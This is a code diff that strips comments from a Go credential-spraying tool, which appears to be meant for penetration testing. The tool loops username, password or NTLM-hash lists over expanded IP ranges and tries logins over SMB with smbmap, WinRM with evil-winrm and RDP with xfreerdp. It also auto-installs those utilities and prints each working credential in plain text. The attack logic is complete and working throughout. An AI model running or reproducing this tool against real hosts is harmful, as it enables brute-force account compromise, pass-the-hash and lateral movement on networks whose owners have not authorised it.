@@ -8,9 +8,9 @@ import (
 	"io"
 	"net"
 	"os"
-	"os/exec" // Only one import for os/exec
+	"os/exec"
 	"runtime"
-	"strconv" // This is needed for strconv.Atoi in expandHostRange
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -21,12 +21,9 @@ var (
 )
 
 func ensureCommandInstalled(command string, installCommand string) error {
-	// Check if the command is not installed
 	_, err := exec.LookPath(command)
 	if err != nil {
 		fmt.Printf("%s is not installed. Attempting to install...\n", command)
-
-		// Install the command based on the OS
 		var installCmd *exec.Cmd
 		switch runtime.GOOS {
 		case "linux":
@@ -36,43 +33,33 @@ func ensureCommandInstalled(command string, installCommand string) error {
 		default:
 			return fmt.Errorf("Unsupported OS: %s", runtime.GOOS)
 		}
-
-		// Run the installation command
 		err := installCmd.Run()
 		if err != nil {
-			return err // Installation failed
+			return err
 		}
-
-		// Check again if the command is installed
 		_, err = exec.LookPath(command)
 		if err == nil {
 			fmt.Printf("%s installed successfully.\n", command)
 		} else {
 			return fmt.Errorf("Failed to install %s", command)
 		}
-	} else {
-		//fmt.Printf("%s is already installed.\n", command)
 	}
 
 	return nil
 }
 func checkSMB(username string, secret string, host string, domain string, passwordCounter string, useHash bool) bool {
-	// Construct the smbmap command
 	var cmdArgs []string
 	cmdArgs = append(cmdArgs, "-u", username)
-	cmdArgs = append(cmdArgs, "-H", host) // Host flag
+	cmdArgs = append(cmdArgs, "-H", host)
 
-	// Conditionally include the domain if it's provided
 	if domain != "" {
 		cmdArgs = append(cmdArgs, "-d", domain)
 	}
 
-	// Append the password or hash to the command arguments
 	if useHash {
-		// Prepend the empty LM hash part to the NTLM hash
 		cmdArgs = append(cmdArgs, "-p", "00000000000000000000000000000000:"+secret)
 	} else {
-		cmdArgs = append(cmdArgs, "-p", secret) // Use password
+		cmdArgs = append(cmdArgs, "-p", secret)
 	}
 
 	cmd := exec.Command("smbmap", cmdArgs...)
@@ -80,7 +67,6 @@ func checkSMB(username string, secret string, host string, domain string, passwo
 	cmd.Stdout = &out
 	cmd.Stderr = &out
 
-	// Run the smbmap command
 	err := cmd.Run()
 	outputStr := out.String()
 
@@ -92,14 +78,13 @@ func checkSMB(username string, secret string, host string, domain string, passwo
 		return false
 	}
 
-	// Use the output to extract the result
 	smbResult := extractSMBMapResult(outputStr)
 	if strings.Contains(smbResult, "Authentication failed") || strings.Contains(outputStr, "STATUS_LOGON_FAILURE") {
 		fmt.Printf("SMB Authentication failed for user #%s with %s using %s on %s\n", passwordCounter, username, secret, host)
 		return false
 	} else if strings.Contains(smbResult, "READ,WRITE") || strings.Contains(smbResult, "READ ONLY") {
 		fmt.Printf("\033[33m→ \033[34mSMB Successfully authenticated with credentials %s/%s on %s \033[33m←\033[0m\n", username, secret, host)
-		fmt.Println("\nSMBMap Result:\n" + smbResult) // Print the full smbmap result
+		fmt.Println("\nSMBMap Result:\n" + smbResult)
 	} else {
 		fmt.Printf("\033[33mSMB Successfully authenticated #%s with %s on %s but no useful access was found\033[0m\n", passwordCounter, username, host)
 	}
@@ -177,7 +162,6 @@ ssh_auth_check(host, username, password)
 }
 
 func checkWinRM(username, secret, host string, useHash bool) bool {
-	// Python code as a string with correctly adjusted indentation
 	pythonCode := `import subprocess
 import sys
 import time
@@ -216,7 +200,6 @@ if __name__ == "__main__":
     result = run_evil_winrm(host, username, secret, use_hash)
     print(f"Result: {result}")`
 
-	// Construct the command arguments
 	cmdArgs := []string{"-c", pythonCode, host, username}
 	if useHash {
 		cmdArgs = append(cmdArgs, "-hash", secret)
@@ -224,7 +207,6 @@ if __name__ == "__main__":
 		cmdArgs = append(cmdArgs, "-password", secret)
 	}
 
-	// Execute the Python script
 	cmd := exec.Command("python", cmdArgs...)
 	var out bytes.Buffer
 	cmd.Stdout = &out
@@ -238,7 +220,6 @@ if __name__ == "__main__":
 		return false
 	}
 
-	// Interpret the output from the Python script
 	if strings.Contains(outputStr, "Connection Success") {
 		fmt.Printf("\033[33m→ \033[34mWinRM Successfully authenticated with credentials %s/%s on %s \033[33m←\033[0m\n", username, secret, host)
 		return true
@@ -247,15 +228,11 @@ if __name__ == "__main__":
 		return false
 	}
 
-	// Handle unknown or unexpected output
 	fmt.Printf("\033[33mWINRM Connection status unknown on %s with %s/%s: %s\033[0m\n", host, username, secret, outputStr)
 	return false
 }
 func checkRDP(username, password, host string) bool {
-	// Setup the command to run xfreerdp
 	cmd := exec.Command("xfreerdp", fmt.Sprintf("/v:%s", host), "/cert:ignore", fmt.Sprintf("/u:%s", username), fmt.Sprintf("/p:%s", password))
-
-	// Create pipes to read the standard output and error of the process
 	stdoutPipe, err := cmd.StdoutPipe()
 	if err != nil {
 		fmt.Printf("Error creating stdout pipe: %s\n", err)
@@ -268,17 +245,14 @@ func checkRDP(username, password, host string) bool {
 		return false
 	}
 
-	// Start the xfreerdp process
 	if err := cmd.Start(); err != nil {
 		fmt.Printf("Failed to start RDP on %s with %s/%s: %s\n", host, username, password, err)
 		return false
 	}
 
-	// Use a multi-reader to read both stdout and stderr
 	stdoutReader := bufio.NewReader(io.MultiReader(stdoutPipe, stderrPipe))
 	loginFailed := false
 
-	// Goroutine to continuously read from the command's output
 	go func() {
 		for {
 			line, _, err := stdoutReader.ReadLine()
@@ -289,7 +263,6 @@ func checkRDP(username, password, host string) bool {
 				break
 			}
 
-			// Check the line for patterns that indicate a failed login
 			if strings.Contains(string(line), "STATUS_LOGON_FAILURE") ||
 				strings.Contains(string(line), "ERRCONNECT_LOGON_FAILURE") ||
 				strings.Contains(string(line), "ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED") {
@@ -300,17 +273,13 @@ func checkRDP(username, password, host string) bool {
 		}
 	}()
 
-	// Wait for 5 seconds to give xfreerdp enough time to fail or succeed
 	time.Sleep(5 * time.Second)
 
-	// Check the state of the login attempt
 	if loginFailed {
 		fmt.Printf("Failed RDP on %s with %s/%s\n", host, username, password)
 		return false
 	} else {
-		// Display success message in blue
 		fmt.Printf("\033[33m→ \033[34mRDP Successfully authenticated with credentials %s/%s on %s \033[33m←\033[0m\n", username, password, host)
-		// Optionally kill the process after successful check
 		cmd.Process.Kill()
 		return true
 	}
@@ -332,10 +301,8 @@ func expandHostRange(hostRange string) ([]string, error) {
 	parts := strings.Split(hostRange, "-")
 
 	if len(parts) == 1 {
-		// Single host, not a range
 		return []string{hostRange}, nil
 	} else if len(parts) == 2 {
-		// It's a range
 		baseParts := strings.Split(parts[0], ".")
 		if len(baseParts) != 4 {
 			return nil, fmt.Errorf("invalid IP address format")
@@ -385,8 +352,6 @@ func main() {
 	if len(protocols) == 0 {
 		protocols = append(protocols, "all")
 	}
-
-	// Convert the protocols slice to a map for easier checking
 	protocolMap := make(map[string]bool)
 	for _, protocol := range protocols {
 		protocolMap[protocol] = true
@@ -406,29 +371,21 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Ensure evil-winrm is installed
 	if err := ensureCommandInstalled("evil-winrm", "evil-winrm"); err != nil {
 		fmt.Printf("Failed to install evil-winrm: %v\n", err)
 		return
 	}
 
-	// Ensure smbmap is installed
 	if err := ensureCommandInstalled("smbmap", "smbmap"); err != nil {
 		fmt.Printf("Failed to install smbmap: %v\n", err)
 		return
 	}
 
-	// Ensure xfreerdp is installed
 	if err := ensureCommandInstalled("xfreerdp", "freerdp"); err != nil {
 		fmt.Printf("Failed to install xfreerdp: %v\n", err)
 		return
 	}
 
-	// Override default usage
-
-	// Parse the flags
-
-	// Validate username and password flags
 	if singleUsername != "" {
 		if _, err := os.Stat(singleUsername); err == nil {
 			fmt.Println("Error: -u flag should be a string, not a file path")
@@ -443,7 +400,6 @@ func main() {
 		}
 	}
 
-	// Validate username and password file flags
 	if usernameFile != "" {
 		if _, err := os.Stat(usernameFile); os.IsNotExist(err) {
 			fmt.Println("Error: -uf flag should be a file path")
@@ -492,7 +448,6 @@ func main() {
 	}
 
 	for hostIndex, host := range allHosts {
-		// Display a yellow message when starting to scan a host
 		fmt.Printf("\033[33mScanning host %d/%d (%s)...\033[0m\n", hostIndex+1, len(allHosts), host)
 		if protocolMap["all"] || protocolMap["rdp"] {
 			if isPortOpen(host, "3389", 3*time.Second) {
@@ -512,10 +467,10 @@ func main() {
 				for _, username := range usernames {
 					for _, password := range passwords {
 						passwordCounter++
-						useHash := singleHash != "" // Determine if we're using a hash
-						secret := password          // Use the iterated password
+						useHash := singleHash != ""
+						secret := password
 						if useHash {
-							secret = singleHash // Use the hash
+							secret = singleHash
 						}
 						checkSMB(username, secret, host, domain, strconv.Itoa(passwordCounter), useHash)
 					}
@@ -542,10 +497,10 @@ func main() {
 				fmt.Printf("\033[33mChecking WinRM on %s...\033[0m\n", host)
 				for _, username := range usernames {
 					for _, password := range passwords {
-						useHash := singleHash != "" // Determine if we're using a hash
-						secret := password          // Use the iterated password
+						useHash := singleHash != ""
+						secret := password
 						if useHash {
-							secret = singleHash // Use the hash
+							secret = singleHash
 						}
 						checkWinRM(username, secret, host, useHash)
 					}
